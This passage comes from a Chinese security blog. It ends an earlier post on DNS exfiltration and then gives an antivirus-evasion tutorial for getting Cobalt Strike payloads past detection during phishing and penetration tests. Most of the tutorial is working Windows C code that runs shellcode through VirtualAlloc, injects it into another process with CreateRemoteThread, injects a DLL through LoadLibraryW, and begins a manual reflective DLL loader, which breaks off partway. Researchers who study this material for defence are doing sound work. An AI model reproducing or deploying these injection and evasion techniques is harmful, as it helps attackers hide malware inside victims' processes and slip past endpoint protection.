<p>​    DNS外带数据的函数也比较明显，就是他们都是文件操作的函数，也就是说会进行文件读取操作的函数，那如果给这些函数的参数传入UNC路径的内容，就可能会存在DNS请求。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/" class="post-title-link" itemprop="url">关于免杀的技术总结（-）</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-09 20:26:00" itemprop="dateCreated datePublished" datetime="2020-11-09T20:26:00+08:00">2020-11-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-11 19:36:50" itemprop="dateModified" datetime="2020-11-11T19:36:50+08:00">2020-11-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index">
                    <span itemprop="name">免杀</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    在钓鱼或者渗透的过程中，如果我们不会免杀，使用Cobaltstrike生成的exe可能直接就被干掉了，还会触发目标的告警，导致之前的工作前功尽弃，因此在往更高阶的攻防对抗中，免杀能力是必不可少的能力，不是说每个人都必须掌握这种能力，但是如果一个团队中，一个会免杀的人都没有，那就很僵了。</p>
<p>​    回到正题，本片文章并不会讲到免杀方法可能很多已经都不可用了，之所以写这篇总结文章，是希望大家能对免杀的方法能有一个系统的认知。</p>
<h2 id="远程线程调用"><a href="#远程线程调用" class="headerlink" title="远程线程调用"></a>远程线程调用</h2><p>​    要讲远程线程调用，我们首先看一下本地的调用，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;Windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char shellcode[] &#x3D;&quot;shellcode&quot;;</span><br><span class="line">	void *exec &#x3D; VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(exec, shellcode, sizeof shellcode);</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码中用到了几个函数，我大致讲一下：</p>
<p><strong>VirtualAlloc</strong></p>
<p>​    VirtualAlloc函数通常可以用来分配大块的指定大小的内存，它包含如下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数一：要分配的内存区域的地址</span><br><span class="line">参数二：要分配的大小</span><br><span class="line">参数三：要分配的类型 当使用MEM_COMMIT时，代表分配物理内存，并初始化为0，</span><br><span class="line">参数四：内存的初始保护属性 当设置为PAGE_EXECUTE时，代表这个区域的代码可执行，但不可读写。</span><br></pre></td></tr></table></figure>

<p>​    也就是当我们执行VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE)时，就会给我们分配大小为sizeof shellcode大小的内存块，并且初始化为0，并且该内存具有执行权限。</p>
<p>​    我做了一个测试，下面执行后我们分配的地址是0x009e0000</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109204919240.png" alt="image-20201109204919240"></p>
<p>​    我们查看这个地址，可以看到这个地址确实被分配了一大块的内存，并且内容为空。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205007124.png" alt="image-20201109205007124"></p>
<p><strong>memcpy</strong></p>
<p>​    memcpy用来从str2中赋值n个字节数据到str1中。其中str1和str2的类型为指针类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *memcpy(void *str1, const void *str2, size_t n)</span><br></pre></td></tr></table></figure>

<p>​    知道了这个以后，我们就可以知道，当执行memcpy(exec, shellcode, sizeof shellcode) 时，会将长度为sizeof shellcode内容为shellcode的内容复制到exec这个指针所指的位置。</p>
<p>​    shellcode指针指向的地址为0x005cfadc，地址内容如下：</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205508511.png" alt="image-20201109205508511"></p>
<p>​    当执行完memcpy后，我们可以看到，将0x005cfadc内存中的部分数据拷贝到了0x009e0000内存中。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205618924.png" alt="image-20201109205618924"></p>
<p>​    最后我们再看下((void(*)())exec)()大致的意思是将exec这个指针强制转换为函数指针，然后调用这个函数，最终我们的代码得到了执行。</p>
<p>​    我们再来看一下远程线程注入的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;Windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char shellcode[] &#x3D;&quot;shellcode&quot;;</span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	HANDLE remoteThread;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	printf(&quot;Injecting to PID: %i&quot;, atoi(argv[1]));</span><br><span class="line">	processHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span><br><span class="line">	remoteBuffer &#x3D; VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);</span><br><span class="line">	remoteThread &#x3D; CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在上面的代码中，同样调用了几个windows函数，想要理解上面的代码做了什么，首先需要了解这几个windows 函数的功能。</p>
<p><strong>OpenProcess</strong></p>
<p>​    OpenProcess用来打开一个已经存在的进程对象，并返回进程的句柄，这个函数的原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE OpenProcess(</span><br><span class="line">DWORD dwDesiredAccess, &#x2F;&#x2F;访问权限（标志）</span><br><span class="line">BOOL bInheritHandle, &#x2F;&#x2F; 是否继承句柄</span><br><span class="line">DWORD dwProcessId&#x2F;&#x2F; 进程标示符</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>dwDesiredAccess代表获取的访问权限，PROCESS_ALL_ACCESS代表获取所有权限。bInheritHandle代表是否继承句柄为boolean类型，dwProcessId代表进程的id。penProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])))的意思就是获取进程id为argv[1]的进程对象的所有的权限，并返回进程的句柄。</p>
<p><strong>VirtualAllocEx</strong></p>
<p>​    通过这个函数，我们可以在我们获取的进程对象中分配内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAllocEx(</span><br><span class="line">  HANDLE hProcess,&#x2F;&#x2F;我们想要分配内存的进程</span><br><span class="line">  LPVOID lpAddress,&#x2F;&#x2F;受害者进程内存中指定地址的指针</span><br><span class="line">  SIZE_T dwSize,&#x2F;&#x2F;分配的内存区域的大小</span><br><span class="line">  DWORD  flAllocationType,&#x2F;&#x2F;指定要分配的内存类型</span><br><span class="line">  DWORD  flProtect&#x2F;&#x2F;它指定分配的内存保护,我们将其设置为PAGE_EXECUTE_READWRITE。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    通过执行VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE)，我们可以在processHandle指向的进程中分配一块内存，并且设置内存为可执行权限，当函数执行成功，则返回分配内存的首地址，不成功则返回null。当我们执行完内存分配后remoteBuffer中会有一个地址，但是这个地址并不是我们当前进程的地址，而是notepad的地址。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110105814469.png" alt="image-20201110105814469"></p>
<p>​    我们使用hxd来查看这个地址的内容</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110105919797.png" alt="image-20201110105919797"></p>
<p><strong>WriteProcessMemory</strong></p>
<p>​    <code>WriteProcessMemory</code>是一个将数据写入指定进程的内存区域的函数。需要注意的是整个内存区域必须是可写的，否则会失败。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL WriteProcessMemory(</span><br><span class="line">      HANDLE  hProcess,&#x2F;&#x2F;我们想要写入数据的进程</span><br><span class="line">  LPVOID  lpBaseAddress,&#x2F;&#x2F;我们想要写入数据的地址</span><br><span class="line">  LPCVOID lpBuffer,&#x2F;&#x2F;指向必须写入的数据的指针</span><br><span class="line">  SIZE_T  nSize,&#x2F;&#x2F;写入的数据量</span><br><span class="line">  SIZE_T  *lpNumberOfBytesWritten&#x2F;&#x2F;指向SIZE_T的指针，它将存储写入该目标的字节数。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    按照上面的理解，当我们执行完WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL)后，会在processHandle进程中开辟的空间remoteBuffer中写入大小为sizeof shellcode,内容为shellcode的数据。调用后成功将shellcode写入到notepad的内存中</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110155310.png" alt="image-20201110110155310"></p>
<p><strong>CreateRemoteThread</strong></p>
<p>​    CreateRemoteThread在另一个进程的虚拟空间中创建一个线程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateRemoteThread(</span><br><span class="line">  HANDLE                 hProcess,&#x2F;&#x2F; 目标进程句柄</span><br><span class="line">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,&#x2F;&#x2F; 安全属性</span><br><span class="line">  SIZE_T                 dwStackSize, &#x2F;&#x2F; 进程堆栈大小</span><br><span class="line">  LPTHREAD_START_ROUTINE lpStartAddress,  &#x2F;&#x2F; 进程函数</span><br><span class="line">  LPVOID                 lpParameter, &#x2F;&#x2F; 进程参数</span><br><span class="line">  DWORD                  dwCreationFlags, &#x2F;&#x2F; 创建标志</span><br><span class="line">  LPDWORD                lpThreadId &#x2F;&#x2F; 参数返回ID</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    当执行下面的操作时，则会执行remoteBuffer指向的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);</span><br></pre></td></tr></table></figure>

<p>​    最后调用CreateRemoteThread,成功上线，但是这里有一个问题，因为我们现在使用windows创建的notepad为64位，所以我们要编译的这个exe也应该是64位，否则调用CreateRemoteThread会返回0调用失败。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110250322.png" alt="image-20201110110250322"></p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110331437.png" alt="image-20201110110331437"></p>
<h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>​    首先给出DLL注入的代码，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	wchar_t dllPath[] &#x3D; TEXT(&quot;C:\\experiments\\evilm64.dll&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;Injecting DLL to PID: %i\n&quot;, atoi(argv[1]));</span><br><span class="line">	processHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span><br><span class="line">	remoteBuffer &#x3D; VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);</span><br><span class="line">	PTHREAD_START_ROUTINE threatStartRoutineAddress &#x3D; (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);</span><br><span class="line">	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    通过查看上面的代码，我们可以看出上面的代码和远程线程调用的代码类似，不同的是将shellcode数组的地址转换为dll的路径。还有就是调用了GetProcAddress这个函数，我们先了解一下这个函数。</p>
<p><strong>GetProcAddress</strong></p>
<p>​    GetProcAddress是一个计算机函数，功能是检索指定的动态链接库(DLL)中的输出<a href="https://baike.baidu.com/item/库函数/3471322" target="_blank" rel="noopener">库函数</a>地址。lpProcName参数能够识别DLL中的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line">HMODULE hModule, &#x2F;&#x2F; DLL模块句柄</span><br><span class="line">LPCSTR lpProcName &#x2F;&#x2F; 函数名</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    然后我们再来理解一下GetProcAddress(GetModuleHandle(TEXT(“Kernel32”)), “LoadLibraryW”);也就是获取LoadLibraryW函数的地址，LoadLibraryW函数的功能可以加载指定路径的DLL文件。之所以没有直接调用LoadLibraryW函数，是因为这个函数不能直接调用，只能查找这个函数名称所在的内存地址进行调用。</p>
<p>​    所以使用DLL注入的过程大概是这样的</p>
<ul>
<li><p>OpenProcess 找到我们想要注入进程的句柄，获取权限</p>
</li>
<li><p>VirtualAllocEx 分配内存，用来存放我们DLL的路径</p>
</li>
<li><p>WriteProcessMemory 将DLL的路径写入分配的内存</p>
</li>
<li><p>GetProcAddress 获取LoadLibraryW这个库函数的地址</p>
</li>
<li><p>CreateRemoteThread 使用LoadLibraryW加载DLL执行</p>
<p>我们调试一下，看和我们分析的结果是否相同，首先在执行完VirtualAllocEx 会分配一块内存</p>
</li>
</ul>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151824300.png" alt="image-20201110151824300"></p>
<p>​    我们使用HXD找到这块内存，看是否分配成功，如下所示：</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151807657.png" alt="image-20201110151807657"></p>
<p>​    再继续执行，WriteProcessMemory函数执行后，会再该内存写入我们DLL的地址</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151957686.png" alt="image-20201110151957686"></p>
<p>​    最后，当我们调用CreateRemoteThread后，成功上线。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110152028142.png" alt="image-20201110152028142"></p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110152054110.png" alt="image-20201110152054110"></p>
<h2 id="反射DLL注入"><a href="#反射DLL注入" class="headerlink" title="反射DLL注入"></a>反射DLL注入</h2><p>​    上面我们演示的DLL注入技术有一个很明显的缺陷，那就是必须让我们的DLL在目标的硬盘上，直接将我们恶意的DLL放到硬盘中，无疑加大了被查杀的风险，因此下来我们来了解一下不落地执行DLL的方法，那就是反射DLL注入技术，它允许我们从内存中向受害者进程注入DLL。</p>
<p>​    我们先看一下简单的反射DLL的栗子，首先使用vs创建一个DLL项目，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBoxA(NULL, &quot;注入成功!&quot;, &quot;提示&quot;, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码内容比较简单，当调用这个DLL时，会弹出一个框提示注入成功，重点在下面的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_BLOCK &#123;</span><br><span class="line">	DWORD PageAddress;</span><br><span class="line">	DWORD BlockSize;</span><br><span class="line">&#125; BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class="line">	USHORT Offset : 12;</span><br><span class="line">	USHORT Type : 4;</span><br><span class="line">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class="line"></span><br><span class="line">using DLLEntry &#x3D; BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; get this module&#39;s image base address</span><br><span class="line">	PVOID imageBase &#x3D; GetModuleHandleA(NULL);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; load DLL into memory</span><br><span class="line">	HANDLE dll &#x3D; CreateFileA(&quot;\\\\VBOXSVR\\Experiments\\MLLoader\\MLLoader\\x64\\Debug\\dll.dll&quot;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line">	DWORD64 dllSize &#x3D; GetFileSize(dll, NULL);</span><br><span class="line">	LPVOID dllBytes &#x3D; HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);</span><br><span class="line">	DWORD outSize &#x3D; 0;</span><br><span class="line">	ReadFile(dll, dllBytes, dllSize, &amp;outSize, NULL);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; get pointers to in-memory DLL headers</span><br><span class="line">	PIMAGE_DOS_HEADER dosHeaders &#x3D; (PIMAGE_DOS_HEADER)dllBytes;</span><br><span class="line">	PIMAGE_NT_HEADERS ntHeaders &#x3D; (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-&gt;e_lfanew);</span><br><span class="line">	SIZE_T dllImageSize &#x3D; ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; allocate new memory space for the DLL. Try to allocate memory in the image&#39;s preferred base address, but don&#39;t stress if the memory is allocated elsewhere</span><br><span class="line">	&#x2F;&#x2F;LPVOID dllBase &#x3D; VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	LPVOID dllBase &#x3D; VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; get delta between this module&#39;s image base and the DLL that was read into memory</span><br><span class="line">	DWORD_PTR deltaImageBase &#x3D; (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; copy over DLL image headers to the newly allocated space for the DLL</span><br><span class="line">	std::memcpy(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; copy over DLL image sections to the newly allocated space for the DLL</span><br><span class="line">	PIMAGE_SECTION_HEADER section &#x3D; IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">	for (size_t i &#x3D; 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		LPVOID sectionDestination &#x3D; (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-&gt;VirtualAddress);</span><br><span class="line">		LPVOID sectionBytes &#x3D; (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-&gt;PointerToRawData);</span><br><span class="line">		std::memcpy(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);</span><br><span class="line">		section++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; perform image base relocations</span><br><span class="line">	IMAGE_DATA_DIRECTORY relocations &#x3D; 